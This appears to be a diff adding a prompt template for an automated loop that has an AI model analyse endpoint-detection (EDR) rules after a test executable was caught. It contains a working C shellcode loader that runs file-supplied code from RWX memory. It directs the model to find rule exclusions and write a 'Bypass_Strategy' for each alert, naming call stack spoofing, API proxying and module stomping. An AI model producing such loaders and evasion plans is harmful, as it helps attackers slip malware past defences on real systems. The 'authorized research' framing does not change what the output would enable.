@@ -1,0 +1,147 @@
+
+    # EDR Rule Gap Analysis (Authorized Security Research Lab)
+    
+    ## Context
+    We are analyzing EDR detection rules to identify logical gaps and design improvements.
+    A test executable triggered alerts or failed validation. We need to understand each rule's logic, identify exceptions/exclusions, and propose precision improvements.
+    
+    ## Memory & History
+    ### Iteration History
+    Iter 1: [outcome=detected]
+Technique: unknown_approach (Standard implementation)
+Triggered Rules: Malicious Behavior Prevention Alert: Potential Process Creation via ShellCode, Malicious Behavior Prevention Alert: Process Creation from Unbacked Memory via Unsigned Parent
+Analysis: Pending AI Analysis
+    
+    ### Rule Analysis
+    
+    Solved Rules: 
+    Persistent Rules: 
+    Active Rules Details:
+    
+    
+    
+    ### Active Approach Status
+    unknown_approach: 1/3 attempts (target: Malicious Behavior Prevention Alert: Potential Process Creation via ShellCode)
+        
+    
+    
+    
+    ## Previous Test Results
+    Iteration: 1
+    Status: detected
+    Exit Code: 1
+    Output Snippet: 
+    Error Snippet: 
+    Compile Success: True
+    Previous Strategy Plan:
+    N/A
+
+    ## Previous Code (C source that was tested)
+    ```c
+    #include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+#pragma comment(lib, "kernel32.lib")
+
+int main(int argc, char *argv[]) {{
+    if (argc != 2) {{
+        printf("Usage: %s <shellcode_file>\n", argv[0]);
+        return 1;
+    }}
+
+    // Read shellcode from file
+    FILE *fp = fopen(argv[1], "rb");
+    if (!fp) {{
+        printf("Error opening file: %s\n", argv[1]);
+        return 1;
+    }}
+
+    fseek(fp, 0, SEEK_END);
+    size_t shellcode_size = ftell(fp);
+    fseek(fp, 0, SEEK_SET);
+
+    unsigned char *shellcode = (unsigned char*)malloc(shellcode_size);
+    if (!shellcode) {{
+        printf("Error allocating memory for shellcode\n");
+        fclose(fp);
+        return 1;
+    }}
+
+    fread(shellcode, 1, shellcode_size, fp);
+    fclose(fp);
+
+    // Allocate memory with RWX permissions
+    void *exec_mem = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {{
+        printf("Error allocating executable memory\n");
+        free(shellcode);
+        return 1;
+    }}
+
+    // Copy shellcode to executable memory
+    memcpy(exec_mem, shellcode, shellcode_size);
+
+    // Free the shellcode buffer
+    free(shellcode);
+
+    // Execute the shellcode
+    ((void (*)())exec_mem)();
+
+    // Free the executable memory
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+
+    return 0;
+}}
+    ```
+    
+    
+    ## Task
+    1. **Analyze** the execution failure or detection alert using the provided telemetry
+    2. **Per-Rule Analysis**: For EACH triggered detection rule (or previously triggered rule), perform individual gap analysis:
+    - Identify the rule's detection logic and scope
+    - **Priority 1**: Examine the rule's exclusion/exception conditions (check "Active Rules Details" if available)
+    - **Priority 2**: Find gaps in the current technique's implementation that could bypass this specific rule
+    - **Priority 3**: If no gap exists within the current technique, propose alternative approaches
+    3. **Design** next validation strategy focusing on rule gaps, NOT just evasion
+        
+    ## Exclusion Strategy Constraints
+    When analyzing Known_Exclusions, adhere to these rules:
+    - **Ignore `process.executable`**: The loader's filename and filepath cannot be modified, so do not propose exclusions based on them.
+    - **Ignore `code_signature`**: Signatures cannot be applied, so do not propose exclusions based on trusted signers.
+    - **Notable Exclusions**: **Stack-based** (e.g., call stack modules) and **API-based** exclusions.
+
+    ## Example of Analysis Logic
+    When analyzing a detection rule, identify conditions that can be neutralized by altering specific parameters. For instance:
+
+    - **Regex Constraints**: If a rule filters `process.Ext.api.metadata.target_address_path` with a regex like `c:\\windows\\(system32|syswow64)\\[a-z]+.dll`, using a DLL from a different directory (e.g., `C:\\Program Files\\...`) would serve as a bypass technique.
+
+    - **Allowlists**: If there is an exclusion list (`NOT LIKE`) for specific paths such as:
+      - `c:\\windows\\assembly\\nativeimages_*.dll`
+      - `c:\\program files\\*`
+      The detection can be evaded by ensuring the `call_stack` (e.g., via call stack spoofing or API proxying) or module path (e.g., Module Stomping a DLL loaded from that allowed path) aligns with these allowed paths.
+
+    **Requirements for Prompt Construction:**
+    Generalization: Do not fixate only on the examples provided above. The model should flexibly identify "Allowlists" or "Excluded Conditions" within any given rule and prioritize satisfying those exclusions.
+
+    ## Standard Testing Methodologies
+    - **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
+    - **module_stomping**: Load legitimate DLL, locate executable section, overwrite with shellcode. Uses existing executable memory.
+    
+    ## Output Format
+    For Rule: [Rule Name 1]
+    
+    - **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+    - **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+    - **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+    - **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+    For Rule: [Rule Name 1]
+
+    - **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+    - **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+    - **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+    - **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+    [Repeat for each triggered rule]
+    
